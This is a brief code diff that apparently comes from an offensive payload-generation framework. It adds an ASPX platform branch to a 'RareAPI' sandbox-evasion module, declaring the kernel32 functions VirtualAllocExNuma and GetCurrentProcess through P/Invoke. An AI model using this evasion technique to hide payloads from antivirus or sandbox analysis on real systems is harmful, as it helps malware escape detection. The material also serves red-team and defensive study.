@@ -30,6 +30,12 @@ class RareAPI(Evasion):
                 CodeComponent(code.replace("####UUID####", self.uuid)),
                 EvasionComponent(f"CheckRareAPI{self.uuid}();")
             ]
+        elif self.platform == "windows_aspx":
+            module.components = [
+                EvasionComponent(code),
+                DefineComponent("[System.Runtime.InteropServices.DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\nprivate static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);\n"),
+                DefineComponent("[System.Runtime.InteropServices.DllImport(\"kernel32.dll\")]\nprivate static extern IntPtr GetCurrentProcess();\n"),
+            ]
 
         return module
 
